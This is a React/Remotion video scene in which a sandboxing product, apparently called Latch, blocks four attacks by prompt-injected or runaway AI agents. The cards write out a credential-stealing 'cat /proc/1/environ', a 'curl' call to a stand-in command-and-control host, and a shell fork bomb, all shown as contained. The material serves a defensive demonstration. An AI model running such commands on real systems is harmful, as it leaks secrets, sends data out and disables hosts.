import React from "react";
import {
  Audio,
  spring,
  staticFile,
  useCurrentFrame,
  useVideoConfig,
} from "remotion";
import { Subtitle } from "./Subtitle";

export const Phase4Containment: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  const titleProgress = spring({ frame, fps, config: { damping: 14 } });
  const attack1 = spring({ frame: frame - 15, fps, config: { damping: 14 } });
  const attack2 = spring({ frame: frame - 55, fps, config: { damping: 14 } });
  const attack3 = spring({ frame: frame - 95, fps, config: { damping: 14 } });
  const attack4 = spring({ frame: frame - 135, fps, config: { damping: 14 } });

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: "#0d0c0b",
        backgroundImage:
          "radial-gradient(circle at 50% 28%, rgba(34, 197, 94, 0.12) 0%, rgba(13, 12, 11, 0.98) 75%)",
        color: "#fdfbf7",
        fontFamily: "'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif",
        position: "relative",
        padding: "50px 80px",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        boxSizing: "border-box",
        overflow: "hidden",
      }}
    >
      <Audio src={staticFile("voice_phase4.mp3")} />
      <Audio src={staticFile("shield_on.wav")} volume={0.2} />

      {/* Main Title - No Eyebrow */}
      <h1
        style={{
          fontSize: 52,
          fontWeight: 850,
          margin: "15px 0 30px 0",
          textAlign: "center",
          letterSpacing: "-0.03em",
          opacity: titleProgress,
          transform: `scale(${titleProgress})`,
          color: "#fdfbf7",
        }}
      >
        Challenge 1:{" "}
        <span
          style={{
            background: "linear-gradient(135deg, #22c55e 0%, #4ade80 100%)",
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}
        >
          Kernel-Enforced Defenses Under Live Attack
        </span>
      </h1>

      {/* 4 Attack Matrix Cards */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "1fr 1fr",
          gap: 20,
          width: "100%",
          maxWidth: 1600,
        }}
      >
        {/* Moment 1 */}
        <div
          style={{
            padding: 24,
            borderRadius: 20,
            backgroundColor: "rgba(22, 20, 18, 0.85)",
            backdropFilter: "blur(20px)",
            border: "1px solid rgba(255, 255, 255, 0.08)",
            borderTop: "2px solid #ef4444",
            boxShadow: "0 16px 36px rgba(0,0,0,0.5)",
            opacity: attack1,
            transform: `translateY(${(1 - attack1) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
            <span style={{ fontSize: 12, fontWeight: 850, color: "#f87171", letterSpacing: "0.06em" }}>
              CONTAINMENT MOMENT 1
            </span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ ZERO SECRET LEAKAGE
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 6px 0", color: "#fdfbf7", fontWeight: 700 }}>Secret Exfiltration Attack</h3>
          <p style={{ fontSize: 14, color: "#a8a29e", margin: "0 0 10px 0" }}>
            Prompt-injected code runs <code>cat /proc/1/environ</code> to steal cloud API tokens and database keys.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09090b", fontFamily: "monospace", fontSize: 13, color: "#4ade80" }}>
            Result: environment={ } → 0 credentials exposed
          </div>
        </div>

        {/* Moment 2 */}
        <div
          style={{
            padding: 24,
            borderRadius: 20,
            backgroundColor: "rgba(22, 20, 18, 0.85)",
            backdropFilter: "blur(20px)",
            border: "1px solid rgba(255, 255, 255, 0.08)",
            borderTop: "2px solid #38bdf8",
            boxShadow: "0 16px 36px rgba(0,0,0,0.5)",
            opacity: attack2,
            transform: `translateY(${(1 - attack2) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
            <span style={{ fontSize: 12, fontWeight: 850, color: "#38bdf8", letterSpacing: "0.06em" }}>
              CONTAINMENT MOMENT 2
            </span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ NETWORK DROPPED
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 6px 0", color: "#fdfbf7", fontWeight: 700 }}>Command & Control Egress</h3>
          <p style={{ fontSize: 14, color: "#a8a29e", margin: "0 0 10px 0" }}>
            Malicious script attempts outbound exfiltration to <code>curl https://evil-c2.com</code>.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09090b", fontFamily: "monospace", fontSize: 13, color: "#4ade80" }}>
            Result: network_mode="none" → Kernel drops all egress packets
          </div>
        </div>

        {/* Moment 3 */}
        <div
          style={{
            padding: 24,
            borderRadius: 20,
            backgroundColor: "rgba(22, 20, 18, 0.85)",
            backdropFilter: "blur(20px)",
            border: "1px solid rgba(255, 255, 255, 0.08)",
            borderTop: "2px solid #f97316",
            boxShadow: "0 16px 36px rgba(0,0,0,0.5)",
            opacity: attack3,
            transform: `translateY(${(1 - attack3) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
            <span style={{ fontSize: 12, fontWeight: 850, color: "#fb923c", letterSpacing: "0.06em" }}>
              CONTAINMENT MOMENT 3
            </span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ PID LIMIT ENFORCED
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 6px 0", color: "#fdfbf7", fontWeight: 700 }}>Fork Bomb DoS Attempt</h3>
          <p style={{ fontSize: 14, color: "#a8a29e", margin: "0 0 10px 0" }}>
            Runaway agent triggers nested subshell fork bomb <code>:(){ :|:& };:</code>.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09090b", fontFamily: "monospace", fontSize: 13, color: "#4ade80" }}>
            Result: cgroup pids_limit=128 halts recursion without host impact
          </div>
        </div>

        {/* Moment 4 */}
        <div
          style={{
            padding: 24,
            borderRadius: 20,
            backgroundColor: "rgba(22, 20, 18, 0.85)",
            backdropFilter: "blur(20px)",
            border: "1px solid rgba(255, 255, 255, 0.08)",
            borderTop: "2px solid #a855f7",
            boxShadow: "0 16px 36px rgba(0,0,0,0.5)",
            opacity: attack4,
            transform: `translateY(${(1 - attack4) * 30}px)`,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
            <span style={{ fontSize: 12, fontWeight: 850, color: "#c084fc", letterSpacing: "0.06em" }}>
              CONTAINMENT MOMENT 4
            </span>
            <span style={{ padding: "4px 10px", borderRadius: 8, backgroundColor: "rgba(34, 197, 94, 0.2)", color: "#4ade80", fontWeight: 800, fontSize: 12 }}>
              ✓ READ-ONLY ROOTFS
            </span>
          </div>
          <h3 style={{ fontSize: 21, margin: "0 0 6px 0", color: "#fdfbf7", fontWeight: 700 }}>Filesystem Mutation Tampering</h3>
          <p style={{ fontSize: 14, color: "#a8a29e", margin: "0 0 10px 0" }}>
            Agent script attempts to write to root or modify system binary libraries.
          </p>
          <div style={{ padding: "8px 14px", borderRadius: 10, backgroundColor: "#09090b", fontFamily: "monospace", fontSize: 13, color: "#4ade80" }}>
            Result: ReadonlyRootfs=True → Read-only file system (errno 30)
          </div>
        </div>
      </div>

      {/* Verified Cryptographic Containment Receipt Banner */}
      {frame > 350 && (
        <div
          style={{
            position: "absolute",
            bottom: 150,
            backgroundColor: "rgba(18, 16, 15, 0.96)",
            border: "1.5px solid #22c55e",
            borderRadius: 18,
            padding: "16px 36px",
            display: "flex",
            alignItems: "center",
            gap: 24,
            boxShadow: "0 20px 50px rgba(0,0,0,0.8), 0 0 40px rgba(34,197,94,0.25)",
            opacity: spring({ frame: frame - 350, fps, config: { damping: 14 } }),
            transform: `translateY(${(1 - spring({ frame: frame - 350, fps, config: { damping: 14 } })) * 30}px)`,
          }}
        >
          <div
            style={{
              width: 44,
              height: 44,
              borderRadius: "50%",
              backgroundColor: "rgba(34, 197, 94, 0.2)",
              border: "1.5px solid #22c55e",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#4ade80",
              fontWeight: 900,
              fontSize: 20,
            }}
          >
            ✓
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <span style={{ fontSize: 12, fontWeight: 900, color: "#4ade80", letterSpacing: "0.08em" }}>
                CHALLENGE 1 VERIFIED · ZERO LEAKAGE AUDIT
              </span>
              <span style={{ fontSize: 11, padding: "2px 8px", borderRadius: 4, backgroundColor: "rgba(34, 197, 94, 0.25)", color: "#86efac", fontFamily: "monospace" }}>
                RECEIPT SHA-256: af0d03b56bbe0a1a...
              </span>
            </div>
            <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", marginTop: 4 }}>
              All 4 live attack vectors blocked deterministically by host kernel sandboxing
            </div>
          </div>
        </div>
      )}

      <Subtitle text="In Challenge 1, Latch demonstrates deterministic containment against live attacks: zero secret leaks, zero network egress, and PID limits." />
    </div>
  );
};
